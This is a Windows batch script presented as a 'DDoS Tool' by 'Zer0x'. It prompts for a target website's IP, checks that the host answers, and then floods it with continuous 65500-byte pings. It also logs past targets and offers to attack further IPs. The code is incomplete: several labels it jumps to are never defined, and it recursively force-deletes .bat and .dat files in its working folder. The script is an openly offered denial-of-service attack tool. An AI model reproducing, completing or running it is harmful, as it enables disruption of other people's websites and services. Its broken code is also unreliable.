@echo off
mode CON: cols=89 LINES=22
title DDoS Tool v1.00 - Made By Zer0x

set "DIR=C:\Users\%username%\AppData\Local\Temp\DDoS"

if exist %DIR% goto skipmd
md %DIR%

:skipmd
cd %DIR%
goto init

:start
color a
set "o= "
DEL /F /Q /S *.bat *.dat
cls
echo DDoS Tool v1.00 - Made By Zer0x
echo.
echo If You Don't Know Your Target Website's Ip Adress Hold CTRL Then Click On This Link https://dnschecker.org/domain-ip-lookup.php?
echo.
set /p ip= Enter Your Targets Ip Adress Here: 
if %ip%==Skype goto get
if %ip%==skype goto get
if %ip%==SKYPE goto get
if %ip%==Track goto track
if %ip%==track goto track
if %ip%==TRACK goto track
if %ip%==Server goto server
if %ip%==server goto server
if %ip%==SERVER goto server
if %ip%==LIST goto list
if %ip%==list goto list
if %ip%==List goto list
if %ip%==HOME goto home
if %ip%==home goto home
if %ip%==Home goto home
if %ip%==HELP goto help
if %ip%==help goto help
if %ip%==Help goto help

call :color e "                                    Validating IP.." & echo.
ping %ip% -l 32 -t -n 1 >> %DIR%\text.dat -n 1
>nul find "Please check the name and try again." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip2
)
:validip2
>nul find "Destination host unreachable." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip3
)
:validip3
>nul find "Request timed out." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip4
)
:validip4
>nul find "PING: transmit failed. General failure." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip
)

:validip
echo.       >> %DIR%\history.log
echo  %date%            
goto lmao



:ddoslauncher
start /min %DIR%\DDoS-Assistance.bat
set /a launch=%launch% + 1
if %launch%==10 goto lmaoH
goto ddoslauncher


:lmao
color a
cls
set /p text="Press Enter To Start The Ddos Attack..."
cls
ping %IP% -t -l 65500
set /p text="Ddos Sucsess Press Enter To See Choices"
cls
echo 1) Ddos Another Ip 
echo 2) Exit DDoS Tool v1.00
set /p input=">>>"
if %input% EQU 1 goto substart
if %input% EQU 2 Exit
exit


:list
cls
if exist %DIR%\history.log type %DIR%\history.log
echo.
echo.
echo  C)Clear                  E)Back
echo.
echo.
set /p ip=
if %ip%==c goto clear
if %ip%==e goto start
:clear
del %DIR%\history.log
goto start


:launcher
start /min %DIR%\Package-Detector.bat
set /a launch=%launch% + 1
if %launch%==12 goto resetfind
goto launcher


:resetfind
if exist %DIR%\info.bat del %DIR%\info.bat
set /a package=%package% - 1000
if %package%==0 goto invalidip
echo.
echo  Testing Package: %package%
echo ping %ip% -l %package% -t -n 1 >> %DIR%\info.bat
if exist %DIR%\text.dat del %DIR%\text.dat
ping %ip% -l %package% -t -n 2 >> %DIR%\text.dat -n 2
>nul find "Request timed out." %DIR%\text.dat && (
  goto resetfind
) || (
  goto pack
)


:invalidip
call :color c "                                 - IP Does Not Exist -" & echo.
ping localhost -n 2 >NUL
goto start

:init
setlocal EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)
<nul> X set /p ".=."
goto start

:substart
color a
set "o= "
DEL /F /Q /S *.bat *.dat
cls
set /p ip= Choice / IP to target: 
if %ip%==Skype goto get
if %ip%==skype goto get
if %ip%==SKYPE goto get
if %ip%==Track goto track
if %ip%==track goto track
if %ip%==TRACK goto track
if %ip%==Server goto server
if %ip%==server goto server
if %ip%==SERVER goto server
if %ip%==LIST goto list
if %ip%==list goto list
if %ip%==List goto list
if %ip%==HOME goto home
if %ip%==home goto home
if %ip%==Home goto home
if %ip%==HELP goto help
if %ip%==help goto help
if %ip%==Help goto help

call :color e "                                    Validating IP.." & echo.
ping %ip% -l 32 -t -n 1 >> %DIR%\text.dat -n 1
>nul find "Please check the name and try again." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip2
)


